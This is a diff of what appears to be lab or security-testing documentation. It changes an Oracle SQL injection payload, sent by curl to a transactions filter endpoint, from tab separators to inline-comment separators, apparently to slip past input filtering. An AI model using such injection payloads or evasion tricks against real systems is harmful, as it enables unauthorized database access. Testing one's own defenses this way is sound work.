@@ -432,7 +432,7 @@ Optional curl (mirrored query, same as UI):
 
 ```bash
 LB=http://<lb_public_ip>
-PAYLOAD=$'x\'\tOR\tREGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(\'73656c6563742027524553272066726f6d206475616c\'))),\'.\') --'
+PAYLOAD="x'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') --"
 ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$PAYLOAD")
 curl -s -o /dev/null -w "%{http_code}\n" -X POST \
   "$LB/api/transactions/filter?ref=$ENC" \
